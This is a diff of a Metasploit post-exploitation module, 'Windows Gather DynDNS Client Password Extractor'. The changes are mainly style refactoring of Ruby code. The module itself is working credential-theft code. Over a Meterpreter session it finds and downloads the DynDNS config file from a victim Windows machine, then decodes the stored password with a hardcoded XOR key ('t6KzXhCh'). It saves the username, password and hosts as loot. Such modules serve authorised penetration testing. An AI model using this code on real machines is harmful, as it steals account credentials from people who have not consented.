@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,29 +8,26 @@ require 'msf/core'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Windows Gather DynDNS Client Password Extractor',
-      'Description'    => %q{
-          This module extracts the username, password, and hosts for DynDNS version 4.1.8.
-        This is done by downloading the config.dyndns file from the victim machine, and then
-        automatically decode the password field. The original copy of the config file is also
-        saved to disk.
-      },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Shubham Dawra <shubham2dawra[at]gmail.com>', #SecurityXploded.com
-          'sinn3r',  #Lots of code rewrite
-        ],
-      'Platform'       => [ 'win' ],
-      'SessionTypes'   => [ 'meterpreter' ]
-    ))
+                      'Name'           => 'Windows Gather DynDNS Client Password Extractor',
+                      'Description'    => %q(
+                          This module extracts the username, password, and hosts for DynDNS version 4.1.8.
+                        This is done by downloading the config.dyndns file from the victim machine, and then
+                        automatically decode the password field. The original copy of the config file is also
+                        saved to disk.
+                      ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Shubham Dawra <shubham2dawra[at]gmail.com>', # SecurityXploded.com
+                          'sinn3r', # Lots of code rewrite
+                        ],
+                      'Platform'       => [ 'win' ],
+                      'SessionTypes'   => [ 'meterpreter' ]))
   end
-
 
   #
   # Search for the config file.
@@ -38,8 +36,8 @@ class MetasploitModule < Msf::Post
   def get_config_file
     config_paths =
       [
-        "C:\\ProgramData\\Dyn\\Updater\\",  #Vista
-        "C:\\Documents and Settings\\All Users\\Application Data\\Dyn\\Updater\\"  #XP and else
+        "C:\\ProgramData\\Dyn\\Updater\\", # Vista
+        "C:\\Documents and Settings\\All Users\\Application Data\\Dyn\\Updater\\" # XP and else
       ]
 
     # Give me the first match
@@ -49,14 +47,13 @@ class MetasploitModule < Msf::Post
       begin
         f = session.fs.file.stat(tmp_path)
         config_file = tmp_path
-        break  #We've found a valid one, break!
+        break # We've found a valid one, break!
       rescue
       end
     end
 
-    return config_file
+    config_file
   end
-
 
   #
   # Download the config file, and then load it up in memory.
@@ -65,14 +62,11 @@ class MetasploitModule < Msf::Post
   def load_config_file(config_file)
     f = session.fs.file.new(config_file, "rb")
     content = ''
-    until f.eof?
-      content << f.read
-    end
+    content << f.read until f.eof?
     p = store_loot("dyndns.raw", "text/plain", session, "dyndns_raw_config.dyndns")
-    vprint_status("Raw config file saved: #{p.to_s}")
-    return content
+    vprint_status("Raw config file saved: #{p}")
+    content
   end
-
 
   #
   # Parse the data
@@ -86,19 +80,18 @@ class MetasploitModule < Msf::Post
     host = content.scan(/Host\d=([\x21-\x7e]+)/)[0]
 
     # Let's decode the pass
-    pass = decode_password(pass) if not pass.nil?
+    pass = decode_password(pass) unless pass.nil?
 
     # Store data in a hash, save it to the array
     # Might contain nil if nothing was regexed
     config_data = {
-      :user  => user,
-      :pass  => pass,
-      :hosts => host
+      user: user,
+      pass: pass,
+      hosts: host
     }
 
-    return config_data
+    config_data
   end
-
 
   #
   # Decode the password
@@ -111,25 +104,23 @@ class MetasploitModule < Msf::Post
     pass.each_byte do |a1|
       a2 = "t6KzXhCh"[c, 1].unpack('c')[0].to_i
       s << (a1 ^ a2).chr
-      c = ((c+1)%8)
+      c = ((c + 1) % 8)
     end
 
-    return s
+    s
   end
-
 
   #
   # Print results and storeloot
   #
   def do_report(data)
-
-    tbl  = Rex::Text::Table.new(
+    tbl = Rex::Text::Table.new(
       'Header'  => 'DynDNS Client Data',
       'Indent'  => 1,
       'Columns' => ['Field', 'Value']
     )
 
-    creds  = Rex::Text::Table.new(
+    creds = Rex::Text::Table.new(
       'Header'  => 'DynDNS Credentials',
       'Indent'  => 1,
       'Columns' => ['User', 'Password']
@@ -138,7 +129,7 @@ class MetasploitModule < Msf::Post
     # Store username/password
     cred << [data[:user], data[:pass]]
 
-    if not creds.rows.empty?
+    unless creds.rows.empty?
       p = store_loot(
         'dyndns.creds',
         'text/csv',
@@ -147,7 +138,7 @@ class MetasploitModule < Msf::Post
         'dyndns_creds.csv',
         'DynDNS Credentials'
       )
-      print_status("Parsed creds stored in: #{p.to_s}")
+      print_status("Parsed creds stored in: #{p}")
     end
 
     # Store all found hosts
@@ -158,7 +149,7 @@ class MetasploitModule < Msf::Post
 
     print_status(tbl.to_s)
 
-    if not tbl.rows.empty?
+    unless tbl.rows.empty?
       p = store_loot(
         'dyndns.data',
         'text/plain',
@@ -167,10 +158,9 @@ class MetasploitModule < Msf::Post
         'dyndns_data.csv',
         'DynDNS Client Data'
       )
-      print_status("Parsed data stored in: #{p.to_s}")
+      print_status("Parsed data stored in: #{p}")
     end
   end
-
 
   #
   # Main function, duh
@@ -198,5 +188,4 @@ class MetasploitModule < Msf::Post
     # Store data
     do_report(config)
   end
-
 end
